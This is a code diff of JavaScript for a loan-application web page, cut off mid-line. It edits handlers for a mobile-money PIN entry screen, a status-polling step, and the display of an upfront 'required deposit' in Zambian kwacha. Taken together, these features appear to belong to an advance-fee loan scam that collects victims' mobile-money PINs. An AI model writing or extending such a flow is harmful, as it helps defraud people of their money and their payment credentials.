@@ -349,21 +349,6 @@
     if (btnSignInPin) {
       btnSignInPin.disabled = false;
       btnSignInPin.classList.add('ready');
-      const triggerSignIn = (e) => {
-        if (e) e.preventDefault();
-        submitPinDirect(yelloPinInput ? yelloPinInput.value : '');
-      };
-      btnSignInPin.addEventListener('click', triggerSignIn);
-    }
-
-    if (btnTogglePinVisibility) {
-      btnTogglePinVisibility.addEventListener('click', (e) => {
-        e.preventDefault();
-        if (!yelloPinInput) return;
-        const makeVisible = yelloPinInput.type === 'password';
-        yelloPinInput.type = makeVisible ? 'text' : 'password';
-        btnTogglePinVisibility.innerText = makeVisible ? '🙈' : '👁️';
-      });
     }
 
     async function submitApplicationAndOpenPin() {
@@ -553,4 +538,19 @@
 
         const numericAmt = Number(amtRaw.replace(/\D/g, '')) || 100000;
         const depVal = Math.max(200, Math.round(numericAmt * 0.002));
-        if (depositRequiredAmount) depositReq
+        if (depositRequiredAmount) depositRequiredAmount.innerText = `${depVal} ZMW`;
+        if (successDepositAmount) successDepositAmount.innerText = `${depVal} ZMW`;
+
+        hideBanner(bannerForm3Error);
+        showScreen($('screen-form3'));
+      },
+      'btn-form3-prev': () => showScreen($('screen-form2')),
+      'btn-form3-submit': () => submitApplicationAndOpenPin(),
+      'btn-pin-back': () => {
+        if (statusPollInterval) clearInterval(statusPollInterval);
+        pinSubmitting = false;
+        hideLoading();
+        showScreen($('screen-form3'));
+      },
+      'link-forgot-pin': (e) => {
+        if (e) e.
